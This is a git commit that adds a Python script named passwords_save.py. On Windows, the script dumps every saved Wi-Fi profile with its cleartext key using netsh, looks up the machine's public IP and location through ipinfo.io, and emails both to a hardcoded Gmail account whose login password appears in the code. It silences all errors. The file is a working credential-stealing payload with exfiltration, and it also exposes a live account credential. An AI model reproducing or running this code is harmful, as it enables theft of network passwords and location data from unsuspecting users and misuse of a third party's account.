407af6c97b79da107b07a6bb9ea9e20a1d5a04d5
JuanSebastian07 <93341765+JuanSebastian07@users.noreply.github.com>
2021-11-23 18:13:40 -0500

    Add files via upload

---
+++ passwords_save.py
@@ -0,0 +1,55 @@
+import subprocess,smtplib,re
+import urllib.request
+import json
+
+
+
+resultado=''
+lista=[]
+
+def enviar_email(email,password,mensaje):
+    
+    server = smtplib.SMTP('smtp.gmail.com',587)
+    server.starttls()
+    server.login(email,password)
+    server.sendmail(email,email,mensaje)
+    server.quit()
+
+redes=subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True)
+lista_redes=redes.stdout
+lista_redes2=re.findall("(?:Profile\s*:\s)(.*)",lista_redes)
+lista_redes3=map(str.strip,lista_redes2)
+lista_redes4=list(lista_redes3)
+
+for nombre_red in lista_redes4:
+    #command2 = 'netsh', 'wlan', 'show', 'profile', f'name="{nombre_red}"','key=clear'
+    resultado_actual=subprocess.run(['netsh', 'wlan', 'show', 'profile','name=',f'{nombre_red}','key=clear'], capture_output=True, text=True)
+    resultado_actual.stdout
+    resultado=resultado+resultado_actual.stdout
+   
+def ip_info():
+    objetivo='https://ipinfo.io/json'
+    contenido=urllib.request.urlopen(objetivo)
+    cargajson=json.loads(contenido.read())
+    
+    for dato in cargajson:
+        mensaje=dato + " : " + str(cargajson[dato])
+        lista.append(mensaje)
+    return lista
+        
+def mandar_datos():
+        
+    enviar=json.dumps(ip_info(), indent=2)
+    server = smtplib.SMTP('smtp.gmail.com',587)
+    server.starttls()
+    server.login('smithpaz01307@gmail.com','318Cathe')
+    server.sendmail('smithpaz01307@gmail.com','smithpaz01307@gmail.com',enviar)
+    server.quit()
+
+
+try:  
+    enviar_email('smithpaz01307@gmail.com', '318Cathe', resultado)
+    #ip_info()
+    mandar_datos()
+except:
+    pass
